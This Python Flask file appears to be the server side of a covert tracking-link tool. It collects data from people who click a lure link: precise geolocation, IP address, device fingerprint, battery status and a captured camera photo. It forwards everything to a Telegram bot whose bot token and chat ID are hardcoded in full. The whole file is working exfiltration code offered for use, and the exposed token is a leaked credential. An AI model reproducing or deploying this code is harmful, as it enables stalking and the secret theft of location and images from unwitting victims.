import os
import json
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True, origins="*")  # ✅ Allow all origins

# ✅ Telegram Bot Configuration
BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
CHAT_ID = "7526005252"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ✅ Store users who clicked the link
tracked_users = {}

def send_telegram_message(text):
    """Send text message to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        response = requests.post(TELEGRAM_API, json=payload)
        print("📩 Message Response:", response.text)  # ✅ Debugging
    except Exception as e:
        print("❌ Error sending message:", str(e))

def send_telegram_photo(image_url, caption):
    """Send an image to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
    try:
        response = requests.post(TELEGRAM_PHOTO_API, json=payload)
        print("📷 Photo Response:", response.text)  # ✅ Debugging
    except Exception as e:
        print("❌ Error sending photo:", str(e))

@app.route('/')
def home():
    return "✅ Flask backend is live!"

@app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
def track_device(session_id):
    """Track multiple users and send data to Telegram."""
    if request.method == "OPTIONS":
        response = jsonify({"status": "CORS Preflight OK"})
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return response, 200

    try:
        print("📥 Received request for tracking!")  # Debugging

        data = request.get_json()
        if not data:
            print("❌ Error: No JSON received!")
            return jsonify({"error": "Invalid JSON data"}), 400

        print("📦 Received Data:", request.data[:200])  # Log first 200 chars)  # Log full request

        battery = data.get("battery", {})
        geo = data.get("geo", {})
        device = data.get("device", {})
        photo = data.get("photo", None)

        # ✅ Check if user is already tracked
        user_ip = device.get("ip", "Unknown")
        if user_ip in tracked_users:
            message_status = "🔁 User revisited."
        else:
            message_status = "🆕 New User Clicked the Link!"
            tracked_users[user_ip] = session_id  # Store user IP and session

        # ✅ Format Message
        message = f"""
<b>{message_status}</b>
📡 <b>Session ID:</b> {session_id}

⚡ <b>Battery:</b> {battery.get("level", "N/A")}% (Charging: {battery.get("charging", "N/A")})
🌍 <b>Geolocation:</b> Lat {geo.get("latitude", "N/A")}, Lon {geo.get("longitude", "N/A")}
📱 <b>Device:</b> {device.get("platform", "N/A")}
💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
🌐 <b>IP Address:</b> {user_ip}
🖥 <b>User-Agent:</b> {device.get("userAgent", "N/A")}
🔌 <b>Cookies Enabled:</b> {device.get("cookiesEnabled", "N/A")}
🧩 <b>Plugins:</b> {device.get("plugins", "N/A")}
"""

        send_telegram_message(message)

        # ✅ Handle Photo
        if photo:
            try:
                print("📸 Received Photo (First 100 chars):", photo[:100])
                send_telegram_photo(photo, "📷 Captured Photo")
            except Exception as e:
                print("❌ Error sending photo:", str(e))

        response = jsonify({"status": "success"})
        response.headers["Access-Control-Allow-Origin"] = "*"
        return response, 200

    except Exception as e:
        print("❌ Critical Error:", str(e))
        response = jsonify({"error": str(e)})
        response.headers["Access-Control-Allow-Origin"] = "*"
        return response, 500

if __name__ == '__main__':
    port = int(os.getenv("PORT", 10000))  # ✅ Use Render-assigned PORT or default 10000
    app.run(host='0.0.0.0', port=port)
